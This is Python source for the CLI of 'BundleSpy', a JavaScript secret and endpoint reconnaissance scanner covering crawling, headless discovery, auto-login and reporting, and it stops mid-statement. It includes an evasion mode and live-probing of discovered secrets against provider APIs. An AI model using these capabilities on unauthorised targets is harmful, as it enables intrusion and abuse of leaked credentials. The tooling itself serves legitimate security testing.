"""
BundleSpy CLI — clean, automation-friendly, no interactive prompts.
"""

import sys
import os
import re
import argparse
import logging
from datetime import datetime
from pathlib import Path

from .config import BundleSpyConfig, CrawlerConfig, ScopeConfig, ReportingConfig
from .config import PROJECT_NAME, PROJECT_VERSION, AUTHOR_NAME, GITHUB_URL
from .safety.network import validate_url
from .crawler.fetcher import Fetcher
from .crawler.scope import ScopeChecker
from .crawler.crawler import Crawler
from .analysis.secrets import SecretScanner
from .analysis.endpoints import extract_endpoints
from .analysis.ast_endpoints import (
    extract_all_endpoints, extract_dynamic_imports, extract_workers,
    extract_graphql_operations,
)
from .analysis.route_extractor import extract_routes
from .analysis.endpoint_intel import extract_endpoint_intelligence
from .analysis.infrastructure import extract_infrastructure
from .analysis.jwt import find_jwts
from .analysis.endpoint_classifier import (
    classify_endpoints, verify_candidates,
    confirmed_only, verbose_output, debug_dump,
    SCORE_DROP, SCORE_LOW_CONF,
)
from .storage.models import ScanResult, Finding, Endpoint, InfrastructureItem, JSFile
from .reporting.terminal import print_report
from .reporting.json_report import generate as generate_json
from .reporting.html_report import generate as generate_html
from .reporting.csv_report import generate as generate_csv
from .reporting.burp_export import generate_burp_xml, generate_url_list
from .ui.printer import (
    print_header, phase, phase_done, phase_warn, phase_error,
)
from .ui.theme import A


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="bundlespy",
        description="BundleSpy — JavaScript Intelligence and Secret Exposure Scanner",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
quick start:
  bundlespy scan https://target.com                          basic crawl + secrets + endpoints
  bundlespy scan https://target.com --headless --stealth     full browser-based scan, evasion on
  bundlespy scan https://target.com --validate-secrets       live-probe every found secret
  bundlespy local ./dist/                                    scan a local build folder

deep recon:
  bundlespy scan https://target.com --source-maps --chunks   recover source files + webpack chunks
  bundlespy scan https://target.com --graphql                introspect GraphQL schema
  bundlespy scan https://target.com --harvest-subs           extract subdomains from JS + endpoints
  bundlespy scan https://target.com --passive                pull historical JS from web archives

authenticated scans:
  bundlespy scan https://target.com --cookie "session=abc123"
  bundlespy scan https://target.com --login "url=https://target.com/login,user=admin,pass=secret"
  bundlespy scan https://target.com --headless --cookie "token=xyz" --stealth

output:
  bundlespy scan https://target.com --format html --output ./reports/
  bundlespy scan https://target.com --format html,json,burp --output ./reports/
  bundlespy scan https://target.com --silent                 findings only, no headers
  bundlespy scan https://target.com --json -q                JSON to stdout, no progress

other:
  bundlespy demo                                             offline demo with fake findings
""",
    )

    sub = parser.add_subparsers(dest="command")

    # ── scan ──────────────────────────────────────────────────────────────────
    scan = sub.add_parser(
        "scan",
        help="Scan a live target URL",
        description=(
            "Crawl a target, extract all JS files, and analyze them for secrets,\n"
            "API endpoints, infrastructure hints, and vulnerable libraries.\n\n"
            "crawl options control how aggressively JS is discovered.\n"
            "feature flags layer on top: source maps, webpack chunks, headless\n"
            "browser, GraphQL introspection, subdomain harvesting, secret validation.\n"
        ),
        formatter_class=argparse.RawTextHelpFormatter,
    )
    scan.add_argument("target")

    # Crawl
    _cg = scan.add_argument_group("crawl")
    _cg.add_argument("--depth",        type=int, default=5,    metavar="N", help="Max crawl depth from the target root (default: 5)")
    _cg.add_argument("--max-pages",    type=int, default=500,  metavar="N", help="Max pages to visit during crawl (default: 500)")
    _cg.add_argument("--max-js",       type=int, default=1000, metavar="N", help="Max JS files to collect (default: 1000)")
    _cg.add_argument("--rate",         type=int, default=3,    metavar="N", help="Requests per second (default: 3)")
    _cg.add_argument("--timeout",      type=int, default=10,   metavar="S", help="Per-request timeout in seconds (default: 10)")
    _cg.add_argument("--common-paths", action="store_true",                  help="Probe common paths (/robots.txt, /sitemap.xml, etc.)")
    _cg.add_argument("--subdomains",   action="store_true",                  help="Follow links to subdomains of the target")
    _cg.add_argument("--exclude",      nargs="+", default=[],  metavar="PAT", help="URL patterns to exclude from crawl (substring match)")

    # Features
    _fg = scan.add_argument_group("features")
    _fg.add_argument("-M", "--source-maps",      action="store_true", help="Fetch and parse .map files to recover original source")
    _fg.add_argument("-C", "--chunks",           action="store_true", help="Discover and download webpack chunk files")
    _fg.add_argument("-P", "--passive",          action="store_true", help="Pull historical JS from Wayback Machine + CommonCrawl instead of crawling live")
    _fg.add_argument("-H", "--headless",         action="store_true", default=True, help="Launch a real browser to trigger lazy-loaded JS and intercept network calls (default: on)")
    _fg.add_argument("-S", "--stealth",          action="store_true", help="Enable evasion: randomized delays, realistic headers, no automation flags")
    _fg.add_argument("--no-verify",             action="store_true", help="Disable SSL certificate verification (use for self-signed certs)")
    _fg.add_argument("-V", "--validate",         action="store_true", help="HTTP-probe discovered endpoints to confirm they respond")
    _fg.add_argument("-K", "--validate-secrets", action="store_true", help="Live-probe found secrets against their provider APIs to confirm they are active")
    _fg.add_argument("-G", "--graphql",          action="store_true", help="Run GraphQL introspection on any GraphQL endpoints found")
    _fg.add_argument("-U", "--harvest-subs",     action="store_true", help="Extract subdomains referenced in JS and endpoints")

    # Headless options
    _hg = scan.add_argument_group("headless options (require --headless)")
    _hg.add_argument("--workers",     type=int, default=5, metavar="N",
                     help="Parallel browser instances for headless scan (default: 5; lower to 1-2 if WAF is active)")
    _hg.add_argument("--interact",    action="store_true",
                     help="Enable safe UI interaction: expand nav tabs, accordions, dropdowns (whitelist-only, never submits forms or clicks destructive elements)")
    _hg.add_argument("--page-load-strategy", default="domcontentloaded", metavar="MODE",
                     choices=["none", "domcontentloaded", "load", "heuristic"],
                     help="Page stabilization strategy (default: domcontentloaded)\n"
                          "  none            - return immediately after navigation commit\n"
                          "  domcontentloaded - DOMContentLoaded + DOM quiet window (fast, works on SSE apps)\n"
                          "  load            - window load event + JS in-flight quiet\n"
                          "  heuristic       - URL-change detection + network idle + DOM stability (thorough, slow)")
    _hg.add_argument("--dom-wait-time", type=int, default=1, metavar="SECS",
                     help="Extra seconds of DOM quiet after DOMContentLoaded (default: 1)\n"
                          "Increase on slow SPAs. Only applies to domcontentloaded strategy.")

    # Auth
    _ag = scan.add_argument_group("authentication")
    _ag.add_argument("-c", "--cookie", default="", metavar="STRING",
                     help="Session cookie string to send with every request\n  e.g. --cookie \"session=abc123; csrf=xyz\"")
    _ag.add_argument("--header", action="append", default=[], metavar="NAME:VALUE",
                     help="Extra request header (repeat for multiple)\n  e.g. --header \"Authorization: Bearer token\"")
    _ag.add_argument("--login", default="", metavar="SPEC",
                     help=(
                         "Auto-login via browser before scanning. Formats:\n"
                         "  url=https://site.com/login,user=admin,pass=secret\n"
                         "  user=admin,pass=secret  (uses target URL as login page)"
                     ))

    # Output
    _og = scan.add_argument_group("output")
    _og.add_argument("-f", "--format", default="terminal", metavar="FMT",
                     help="Output format: terminal (default), html, json, csv, burp\n  combine with commas: --format html,json,burp")
    _og.add_argument("-o", "--output", default="",         metavar="DIR",
                     help="Directory to write report files (default: ./bundlespy-reports/)")
    _og.add_argument("--report-name", default="",         metavar="NAME",
                     help="Custom filename stem for reports (e.g. client-webapp-2026)")
    _og.add_argument("-v", "--verbose",  action="store_true", default=True, help="Show more detail including low-confidence endpoints (default: on)")
    _og.add_argument("-vv","--debug",    action="store_true", help="Full debug output including classifier scoring")
    _og.add_argument("-q", "--quiet",    action="store_true", help="Suppress all progress output")
    _og.add_argument("--no-color",       action="store_true", help="Disable ANSI colors")
    _og.add_argument("--json",           action="store_true", help="JSON to stdout only (sets --quiet)")
    _og.add_argument("--csv",            action="store_true", help="CSV to stdout only (sets --quiet)")
    _og.add_argument("--show-fp",        action="store_true", help="Include likely false positives in output")
    _og.add_argument("--silent",         action="store_true", help="Print only findings, one per line - no headers or progress")

    # ── local ─────────────────────────────────────────────────────────────────
    local = sub.add_parser(
        "local",
        help="Scan a local directory or JS file",
        description=(
            "Analyze local JS files for secrets, endpoints, and infrastructure.\n"
            "Pass a directory (scans all .js files recursively) or a single file.\n\n"
            "Useful for scanning a build output folder before deploying,\n"
            "or auditing a downloaded JS bundle offline.\n"
        ),
        formatter_class=argparse.RawTextHelpFormatter,
    )
    local.add_argument("path", help="Path to a JS file or directory to scan")
    local.add_argument("--format",        default="terminal", metavar="FMT",
                       help="Output format: terminal (default), html, json, csv")
    local.add_argument("--output",        default="",         metavar="DIR",
                       help="Directory to write report files")
    local.add_argument("--report-name",   default="",         metavar="NAME",
                       help="Custom filename stem for reports")
    local.add_argument("-v", "--verbose", action="store_true", default=True, help="Show more detail (default: on)")
    local.add_argument("--no-color",      action="store_true", help="Disable ANSI colors")

    # ── demo ──────────────────────────────────────────────────────────────────
    demo = sub.add_parser(
        "demo",
        help="Run an offline demo with fake findings",
        description=(
            "Print a sample scan report using fake data — no network access needed.\n\n"
            "examples:\n"
            "  bundlespy demo                              terminal output\n"
            "  bundlespy demo --format html                write HTML report to ./bundlespy-reports/\n"
            "  bundlespy demo --format html,json           write both formats\n"
            "  bundlespy demo --format html -o ./demo/     custom output directory\n"
        ),
        formatter_class=argparse.RawTextHelpFormatter,
    )
    demo.add_argument(
        "-f", "--format", default="terminal", metavar="FMT",
        help="Output format: terminal (default), html, json, csv, burp\n  combine with commas: --format html,json",
    )
    demo.add_argument(
        "-o", "--output", default="", metavar="DIR",
        help="Directory to write report files (default: ./bundlespy-reports/)",
    )
    demo.add_argument(
        "--report-name", default="bundlespy-demo", metavar="NAME",
        help="Filename stem for report files (default: bundlespy-demo)",
    )
    demo.add_argument(
        "--no-color", action="store_true",
        help="Disable ANSI colors in terminal output",
    )

    return parser


def _setup_logging(verbose: bool, debug: bool, quiet: bool) -> None:
    if debug:
        level = logging.DEBUG
    elif verbose:
        level = logging.INFO
    elif quiet:
        level = logging.ERROR
    else:
        level = logging.WARNING
    logging.basicConfig(
        level=level,
        format="  %(message)s",
    )


def _write_reports(
    result:             ScanResult,
    formats:            list,
    output_dir:         str,
    started:            datetime,
    report_name:        str  = "",
    extras:             dict = None,
    validation_results: list = None,
    graphql_schemas:    list = None,
    subdomains:         list = None,
) -> dict:
    """Write file reports. Returns dict of format -> path."""
    ts       = started.strftime("%Y%m%d_%H%M%S")
    stem     = report_name.strip() if report_name else f"bundlespy_{ts}"
    # Strip any extension the user may have added — we add the right one
    for ext in (".html", ".json", ".csv", ".xml", ".txt"):
        if stem.lower().endswith(ext):
            stem = stem[:-len(ext)]
    paths   = {}

    if "json" in formats:
        _ext = extras or {}
        out = generate_json(
            result,
            coverage_ledger = _ext.get("coverage_ledger"),
            passive_report  = _ext.get("passive_report"),
        )
        d   = output_dir or "./bundlespy-reports"
        os.makedirs(d, exist_ok=True)
        p   = Path(d) / f"{stem}.json"
        p.write_text(out)
        paths["json"] = str(p)

    if "html" in formats:
        out = generate_html(
            result,
            extras             = extras or {},
            validation_results = validation_results or [],
            graphql_schemas    = graphql_schemas or [],
            subdomains         = subdomains or [],
            report_paths       = paths,
        )
        d   = output_dir or "./bundlespy-reports"
        os.makedirs(d, exist_ok=True)
        p   = Path(d) / f"{stem}.html"
        p.write_text(out)
        paths["html"] = str(p)

    if "csv" in formats:
        out = generate_csv(result)
        d   = output_dir or "./bundlespy-reports"
        os.makedirs(d, exist_ok=True)
        p   = Path(d) / f"{stem}.csv"
        p.write_text(out)
        paths["csv"] = str(p)

    if "burp" in formats:
        d   = output_dir or "./bundlespy-reports"
        os.makedirs(d, exist_ok=True)
        p1  = Path(d) / f"{stem}_burp.xml"
        p2  = Path(d) / f"{stem}_urls.txt"
        p1.write_text(generate_burp_xml(result))
        p2.write_text(generate_url_list(result))
        paths["burp-xml"]  = str(p1)
        paths["burp-urls"] = str(p2)

    return paths


def _analyze(
    js_files: list,
    scanner: SecretScanner,
    *,
    fetcher=None,
    scope=None,
    inline_analyzed_hashes: set = None,
) -> tuple:
    """
    Analyze JS files for secrets, endpoints, and infrastructure.

    Content-hash dedup: if two JSFile objects have identical sha256,
    analyze the content only once but attribute findings/endpoints
    to ALL file URLs that share that content (provenance preserved).

    Static↔runtime endpoint correlation: same canonical URL seen in
    both static JS and runtime interception → one entity, higher confidence.

    Args:
        js_files: List of JSFile objects to analyze.
        scanner: SecretScanner instance.
        fetcher: Optional callable(url) -> JSFile | None for fetching
                 worker/chunk URLs discovered during analysis.
        scope: Optional ScopeChecker instance. URLs that fail scope check
               are not fetched even when fetcher is provided.
        inline_analyzed_hashes: Set of sha256 hashes already processed by
                                 the headless inline engine. Files whose
                                 content hash is in this set are skipped
                                 in the final static-analysis pass to avoid
                                 double-counting.
    """
    findings:      list = []
    endpoints:     list = []
    infra:         list = []
    graphql_ops:   list = []
    dynamic_urls:  list = []   # worker / chunk / dynamic-import URLs to fetch
    seen_finds:    set  = set()
    seen_eps:      set  = set()
    seen_gql:      set  = set()
    seen_dyn:      set  = set()
    # Track which worker/chunk URLs have already been fetched to avoid loops
    fetched_urls: set = set()

    _inline_skip: set = inline_analyzed_hashes or set()

    # Content-hash dedup: sha256 -> list of JSFile sharing that content
    from collections import defaultdict
    content_groups: dict = defaultdict(list)
    no_hash: list = []

    for js in js_files:
        if not js.content:
            continue
        if js.sha256:
            content_groups[js.sha256].append(js)
        else:
            no_hash.append(js)

    # Analyze each unique content once; attribute to all occurrences
    def _process(primary_js: "JSFile", all_urls: list) -> None:
        content = primary_js.content

        # Secret detection — run AST pass first to get env + key-value hits,
        # then feed both into scan_with_env() so regex + AST work together.
        try:
            from .analysis.ast_parser import augment_env_and_extract
            _ast_env, _, _ast_hits = augment_env_and_extract(
                content, primary_js.url,
            )
        except Exception:
            _ast_env = None
            _ast_hits = None

        for f in scanner.scan_with_env(
            content, primary_js.url, primary_js.source_page,
            ast_env=_ast_env, ast_secret_hits=_ast_hits,
        ):
            if f.sha256 not in seen_finds:
                seen_finds.add(f.sha256)
                # Record all occurrence URLs in the finding
                if len(all_urls) > 1:
                    f.occurrences = [f"{u}:{f.line_number}" for u in all_urls]
                findings.append(f)

        # Frontend route extraction runs FIRST so ROUTE-category paths claim
        # their URL keys before the generic extractors can register the same
        # paths as UNKNOWN. Order matters: _add_ep deduplicates by URL key,
        # so whichever extractor fires first wins the category label.
        # React Router, Vue Router, Angular, Next.js, SvelteKit, Nuxt,
        # Tanstack Router, Backbone, generic navigation APIs.
        _eps_this_file = []
        for ep in extract_routes(content, primary_js.url):
            key = ep.url.rstrip("/").lower().split("?")[0]
            if key not in seen_eps:
                seen_eps.add(key)
                ep.source_type = "static"
                _eps_this_file.append(ep)
                endpoints.append(ep)

        # Endpoint extraction — deduplicate by canonical key
        for ep in extract_all_endpoints(content, primary_js.url):
            key = ep.url.rstrip("/").lower().split("?")[0]
            if key not in seen_eps:
                seen_eps.add(key)
                ep.source_type = "static"
                _eps_this_file.append(ep)
                endpoints.append(ep)

        for ep in extract_endpoints(content, primary_js.url):
            key = ep.url.rstrip("/").lower().split("?")[0]
            if key not in seen_eps:
                seen_eps.add(key)
                ep.source_type = "static"
                _eps_this_file.append(ep)
                endpoints.append(ep)

        # Infrastructure detection
        infra.extend(extract_infrastructure(content, primary_js.url))

        # GraphQL operation extraction
        for op in extract_graphql_operations(content, primary_js.url):
            key = f"{op.op_type}:{op.name}"
            if key not in seen_gql:
                seen_gql.add(key)
                graphql_ops.append(op)

        # Collect worker / dynamic-import URLs for second-pass fetching
        from urllib.parse import urljoin
        for di in extract_workers(content, primary_js.url):
            raw = di.url
            if not raw:
                continue
            if not raw.startswith("http") and primary_js.url:
                raw = urljoin(primary_js.url, raw)
            if raw and raw not in seen_dyn:
                seen_dyn.add(raw)
                dynamic_urls.append(raw)
        for di in extract_dynamic_imports(content, primary_js.url):
            raw = di.url
            if not raw:
                continue
            if not raw.startswith("http") and primary_js.url:
                raw = urljoin(primary_js.url, raw)
            if raw and raw not in seen_dyn:
                seen_dyn.add(raw)
                dynamic_urls.append(raw)

    for sha, group in content_groups.items():
        # Skip hashes the headless engine already handled inline
        if sha in _inline_skip:
            continue
        primary = group[0]
        all_urls = [js.url for js in group]
        _process(primary, all_urls)

    for js in no_hash:
        _process(js, [js.url])

    # Worker / dynamic-import chunk fetching.
    # Second pass: fetch every worker / chunk / dynamic-import URL discovered
    # during static analysis and analyze its content too.
    # Uses the dedicated dynamic_urls list (populated by extract_workers /
    # extract_dynamic_imports) rather than filtering the endpoints list, so
    # only real JS resources are fetched, not arbitrary API endpoints.
    if fetcher is not None:
        import hashlib as _hashlib
        from datetime import datetime as _dt
        for url in dynamic_urls:
            # Skip relative URLs (should already be resolved, but guard anyway)
            if not url.startswith("http"):
                continue
            # Skip unresolvable template literals (e.g. ./chunks/${id}.js → .../${id}.js)
            if "${" in url or "{dynamic}" in url:
                continue
            if url in fetched_urls:
                continue
            if scope is not None and not scope.in_scope(url):
                continue
            fetched_urls.add(url)
            try:
                result = fetcher.get(url)
            except Exception:
                continue
            # fetcher.get() returns (content, status_code, content_type, sha256)
            if result is None:
                continue
            try:
                chunk_content, chunk_status, chunk_ctype, chunk_sha = result
            except (TypeError, ValueError):
                continue
            if not chunk_content or chunk_status not in (200,):
                continue
            if not chunk_sha:
                chunk_sha = _hashlib.sha256(chunk_content.encode()).hexdigest()
            # Skip if content already analyzed (inline or main pass)
            if chunk_sha and (chunk_sha in _inline_skip or chunk_sha in content_groups):
                continue
            chunk_js = JSFile(
                url=url,
                source_page=url,
                status_code=chunk_status,
                content_type=chunk_ctype or "application/javascript",
                size_bytes=len(chunk_content),
                sha256=chunk_sha,
                content=chunk_content,
                discovered_at=_dt.utcnow(),
            )
            _process(chunk_js, [url])

    return findings, endpoints, infra, graphql_ops


def run_scan(args) -> int:
    # Handle --json / --csv shortcuts
    if args.json:
        args.format = "json"
        args.quiet  = True
    if args.csv:
        args.format = "csv"
        args.quiet  = True

    _setup_logging(args.verbose, getattr(args, "debug", False), args.quiet)

    # Apply NO_COLOR
    if args.no_color or os.environ.get("NO_COLOR"):
        os.environ["NO_COLOR"] = "1"

    target = args.target.strip()

    # Normalize URL — fix common input mistakes
    # Collapse duplicate schemes: https://https://x -> https://x
    while re.match(r'^https?://https?://', target):
        target = re.sub(r'^https?://(https?://)', r'\1', target)
    # Add scheme if completely missing
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    # Safety check — fail cleanly, no prompt
    safe, reason = validate_url(target, check_dns=False)
    if not safe:
        phase_error(f"Target blocked by safety policy: {reason}")
        return 2

    formats = [f.strip() for f in args.format.split(",")]
    started = datetime.utcnow()
    extras  = {}

    # Determine if login will run (before header print so mode label is accurate)
    _login_spec = getattr(args, "login", "").strip()
    _login_result = None   # populated below after Playwright is available

    if not args.quiet:
        mode = "Passive" if args.passive else ("Headless" if args.headless else "Active")
        if args.stealth:
            mode += " + Stealth"
        if _login_spec:
            mode += " + Auto-Login"
        elif args.cookie or args.header:
            mode += " + Credentials supplied"
        scope_label = "Subdomains included" if args.subdomains else "Strict"
        print_header(target, mode=mode, scope=scope_label, version=PROJECT_VERSION, author=AUTHOR_NAME)

    # Parse extra headers
    extra_headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            extra_headers[k.strip()] = v.strip()
    if args.cookie:
        extra_headers["Cookie"] = args.cookie

    fetcher = Fetcher(
        timeout=args.timeout,
        requests_per_second=args.rate,
        stealth=args.stealth,
        extra_headers=extra_headers,
        verify_ssl=not args.no_verify,
    )
    scope = ScopeChecker(
        target_url=target,
        same_origin=True,
        subdomains=args.subdomains,
        exclude=args.exclude,
    )

    all_js: list = []
    errors: list = []

    # ── Active crawl ──────────────────────────────────────────────────────────
    # Skip crawler when headless + credentials are supplied.
    # The unauthenticated crawler would only hit the login page and waste time.
    # Headless handles full discovery with the authenticated session instead.
    _skip_crawler = args.headless and bool(args.cookie or args.header)
    crawler = None  # may stay None if skipped or passive

    if not args.passive and not _skip_crawler:
        if not args.quiet:
            phase("Crawling target")
        crawler = Crawler(
            target_url=target, fetcher=fetcher, scope=scope,
            max_depth=args.depth, max_pages=args.max_pages,
            max_js_files=args.max_js, common_paths=args.common_paths,
        )
        try:
            crawler.crawl()
        except KeyboardInterrupt:
            phase_warn("Scan interrupted by user")
            return 0

        errors.extend(crawler.errors)
        all_js.extend(crawler.js_files)

        # Include HTML attribute findings from crawler
        html_findings_from_crawler = getattr(crawler, "html_findings", [])

        for idx, (script_content, source_page) in enumerate(crawler.inline_scripts):
            import hashlib
            content_hash = hashlib.sha256(
                script_content.encode("utf-8", errors="ignore")
            ).hexdigest()
            inline_url = (
                f"inline:{source_page}"
                f"#script-{idx + 1}-{content_hash[:12]}"
            )
            all_js.append(JSFile(
                url=inline_url,
                source_page=source_page,
                status_code=200, content_type="text/javascript",
                size_bytes=len(script_content), sha256=content_hash,
                content=script_content,
            ))

        if not args.quiet:
            phase_done("Crawl complete",
                f"{crawler.pages_crawled} pages  {len(crawler.js_files)} JS files")

    # ── Passive ───────────────────────────────────────────────────────────────
    if args.passive:
        if not args.quiet:
            phase("Collecting from web archives")
        from .discovery.passive import collect_passive_js_urls
        passive_urls = collect_passive_js_urls(target)
        new_js = 0
        seen   = set()
        for url in passive_urls[:args.max_js]:
            if url in seen or not scope.in_scope(url):
                continue
            seen.add(url)
            content, status, ct, sha256 = fetcher.get(url)
            if content and status in range(200, 300):
                from datetime import datetime as dt
                all_js.append(JSFile(
                    url=url, source_page=target, status_code=status,
                    content_type=ct, size_bytes=len(content),
                    sha256=sha256, content=content, discovered_at=dt.utcnow(),
                ))
                new_js += 1
        extras["passive_stats"] = {
            "source": "Wayback Machine + CommonCrawl",
            "urls": len(passive_urls), "js": new_js,
            "unique": new_js, "new": new_js,
        }
        if not args.quiet:
            phase_done("Passive collection", f"{len(passive_urls)} archive URLs  {new_js} JS assets")

    # ── Auto-Login ────────────────────────────────────────────────────────────
    if _login_spec:
        from .discovery.autologin import parse_login_arg, auto_login as _auto_login
        _login_cfg = parse_login_arg(_login_spec)
        if not _login_cfg["valid"]:
            phase_error(f"--login parse error: {_login_cfg['error']}")
        else:
            # Resolve login URL: if not provided, use target as login page
            _login_url = _login_cfg["url"] or target

            if not args.quiet:
                phase(f"Auto-login → {_login_url}")

            try:
                from playwright.sync_api import sync_playwright as _sync_pw
                with _sync_pw() as _pw:
                    _browser = _pw.chromium.launch(headless=True)
                    _ctx     = _browser.new_context(
                        user_agent=(
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                            "AppleWebKit/537.36 (KHTML, like Gecko) "
                            "Chrome/122.0.0.0 Safari/537.36"
                        ),
                        extra_http_headers=extra_headers if not args.cookie else {},
                    )
                    # Inject any pre-existing cookies before login
                    if args.cookie:
                        from .discovery.headless import _parse_cookie_string as _pcs
                        from urllib.parse import urlparse as _up_login
                        _pre_domain = _up_login(_login_url).netloc.split(":")[0]
                        _pre_cks = _pcs(args.cookie, _pre_domain)
                        if _pre_cks:
                            _ctx.add_cookies(_pre_cks)
                    _page = _ctx.new_page()
                    _login_result = _auto_login(
                        _page,
                        login_url = _login_url,
                        username  = _login_cfg["username"],
                        password  = _login_cfg["password"],
                        timeout   = args.timeout,
                    )
                    _browser.close()

                # Merge captured cookies into args.cookie so all downstream
                # components (crawler, headless engine) use the session
                if _login_result.get("success") and _login_result.get("cookie_string"):
                    # Merge: autologin cookies override / extend existing --cookie
                    _existing = args.cookie.strip()
                    _new_ck   = _login_result["cookie_string"]
                    if _existing:
                        # Merge by name: new values win
                        _merged = {}
                        for _pair in _existing.split(";"):
                            _pair = _pair.strip()
                            if "=" in _pair:
                                _k, _, _v = _pair.partition("=")
                                _merged[_k.strip()] = _v.strip()
                        for _pair in _new_ck.split(";"):
                            _pair = _pair.strip()
                            if "=" in _pair:
                                _k, _, _v = _pair.partition("=")
                                _merged[_k.strip()] = _v.strip()
                        args.cookie = "; ".join(f"{k}={v}" for k, v in _merged.items())
                    else:
                        args.cookie = _new_ck
                    # Also update extra_headers so the static fetcher uses the session
                    extra_headers["Cookie"] = args.cookie
                    fetcher = Fetcher(
                        timeout=args.timeout,
                        requests_per_second=args.rate,
                        stealth=args.stealth,
                        extra_headers=extra_headers,
                        verify_ssl=not args.no_verify,
                    )
                    if not args.quiet:
                        phase_done(
                            "Auto-login successful",
                            f"{len(_login_result.get('cookies', []))} cookies captured  "
                            f"→ {_login_result.get('final_url', '')}"
                        )
                else:
                    _err = _login_result.get("error_message") or _login_result.get("error") or "unknown"
                    if not args.quiet:
                        phase_warn(f"Auto-login failed: {_err}")

                extras["login_result"] = _login_result

            except Exception as _le:
                _err_msg = str(_le)
                if not args.quiet:
                    phase_warn(f"Auto-login exception: {_err_msg}")
                extras["login_result"] = {
                    "success": False, "method": "exception",
                    "login_url": _login_url, "final_url": _login_url,
                    "error": _err_msg, "steps": [], "cookie_string": "",
                    "cookies": [], "local_storage": {}, "session_storage": {},
                    "token_keys": [], "username_field": "", "password_field": "",
                    "error_message": _err_msg,
                }

    # ── Headless ──────────────────────────────────────────────────────────────
    if args.headless:
        if not args.quiet:
            phase("Launching advanced headless browser")
        from .discovery.headless import collect_headless_full, _parse_cookie_string
        # Extract routes from already-collected JS files
        # so headless visits every Angular/React/Vue route
        from .analysis.ast_endpoints import extract_all_endpoints as _extract_eps
        from urllib.parse import urlparse as _urlparse
        _parsed = _urlparse(target)
        _base   = f"{_parsed.scheme}://{_parsed.netloc}"
        _static_routes = set()
        for _js in all_js:
            if not _js.content:
                continue
            for _ep in _extract_eps(_js.content, _js.url):
                # Only relative paths — these are frontend routes
                if _ep.url.startswith("/") and not _ep.url.startswith("//"):
                    # Skip API paths — we want page routes not API endpoints
                    if not any(k in _ep.url.lower() for k in [
                        "/api/", "/rest/", "/graphql", "/v1/", "/v2/",
                        "/upload", "/download", "/socket",
                    ]):
                        _static_routes.add(_base + _ep.url.split("?")[0])

        # Combine crawler pages + statically discovered routes
        crawler_seen  = getattr(crawler if not args.passive else None, "visited_js", set()) or set()
        crawler_pages = list(getattr(crawler if not args.passive else None, "visited_pages", set()) or set())
        all_seed_urls = list(set(crawler_pages) | _static_routes)

        if _static_routes and not args.quiet and not getattr(args, "silent", False):
            phase(f"Headless will visit {len(all_seed_urls)} pages ({len(_static_routes)} from JS routes)")

        # Parse cookie string into Playwright cookie dicts
        _parsed_domain = _urlparse(target).netloc.split(":")[0]
        _playwright_cookies = _parse_cookie_string(args.cookie, _parsed_domain) if args.cookie else []

        # Pre-seed headless dedup with content hashes from crawler JS files AND
        # inline scripts the static crawler already captured.  Without the inline
        # hashes headless would re-register every inline <script> block it sees on
        # pages the crawler already visited, inflating the unique-asset count.
        import hashlib as _hl
        _crawler_inline_hashes: set = {
            _hl.sha256(content.encode("utf-8", errors="ignore")).hexdigest()
            for content, _ in getattr(crawler, "inline_scripts", [])
            if content
        }
        _crawler_js_hashes = (
            {js.sha256 for js in all_js if js.sha256} | _crawler_inline_hashes
        )

        headless_result = collect_headless_full(
            target, scope,
            stealth       = args.stealth,
            timeout       = args.timeout,
            max_pages     = args.max_pages,
            external_seen = crawler_seen,
            seed_urls     = all_seed_urls,
            interact           = getattr(args, "interact", False),
            workers            = getattr(args, "workers", 5),
            num_browsers       = getattr(args, "workers", 5),
            cookies            = _playwright_cookies,
            extra_headers      = extra_headers,
            seen_hashes        = _crawler_js_hashes,
            forms_mode         = getattr(args, "interact", False),
            page_load_strategy = getattr(args, "page_load_strategy", "domcontentloaded"),
            dom_wait_time      = getattr(args, "dom_wait_time", 1),
        )
        headless_files     = headless_result.get("js_files", [])
        # Tag all browser-captured files so the inventory can distinguish them
        for _hf in headless_files:
            if not getattr(_hf, "source_type", ""):
                _hf.source_type = "browser"
        headless_endpoints = headless_result.get("endpoints", [])
        headless_stats     = headless_result.get("stats", {})

        # Store auth result — used for mode label correction and report
        _auth_result = headless_result.get("auth_result")
        if _auth_result:
            extras["auth_result"] = _auth_result
            # Correct the mode label based on actual verification
            if _auth_result["credentials_supplied"]:
                if _auth_result["authenticated"]:
                    extras["auth_verified"] = True
                else:
                    extras["auth_verified"] = False

        all_js.extend(headless_files)

        # Add network-intercepted endpoints directly
        if headless_endpoints:
            all_endpoints_extra = headless_endpoints
        else:
            all_endpoints_extra = []

        _js_new          = len(headless_files)
        _js_intercepted  = headless_stats.get("js_intercepted", 0)
        # When headless found 0 new files but intercepted >0 JS responses, the
        # static crawler already captured those files (dedup working correctly).
        # Show both counts so the operator isn't misled.
        if _js_intercepted > _js_new:
            _js_label = f"{_js_new} JS new ({_js_intercepted} seen)"
        else:
            _js_label = f"{_js_new} JS"

        extras["headless_stats"] = {
            "pages":          headless_stats.get("pages", 0),
            "js":             _js_new,
            "js_intercepted": _js_intercepted,
            "xhr":            headless_stats.get("xhr", 0),
            "fetch":          headless_stats.get("fetch", 0),
            "ws":             headless_stats.get("ws", 0),
            "routes":         headless_stats.get("routes", 0),
            "endpoints":      headless_stats.get("endpoints", 0),
            "workers":        headless_stats.get("workers", 0),
            "timings":        headless_stats.get("timings", {}),
        }
        if not args.quiet:
            phase_done("Browser discovery",
                f"{headless_stats.get('pages',0)} pages  "
                f"{_js_label}  "
                f"{headless_stats.get('xhr',0)+headless_stats.get('fetch',0)} API calls  "
                f"{headless_stats.get('ws',0)} WS  "
                f"{headless_stats.get('routes',0)} routes"
            )

    # ── Source maps ───────────────────────────────────────────────────────────
    sm_details = {"discovered": 0, "valid": 0, "recovered": 0, "sources": 0, "items": []}
    if args.source_maps:
        if not args.quiet:
            phase("Analyzing source maps")
        from .discovery.source_maps import process_js_file
        recovered_files = []
        for js_file in list(all_js):
            result = process_js_file(js_file, fetcher, scope)
            if result:
                sm_details["discovered"] += 1
                if result.recovered_files:
                    sm_details["valid"]     += 1
                    sm_details["recovered"] += 1
                    sm_details["sources"]   += len(result.recovered_files)
                    sm_details["items"].append({
                        "js":      js_file.url.split("/")[-1],
                        "map":     result.map_url.split("/")[-1] if not result.map_url.startswith("data:") else "inline",
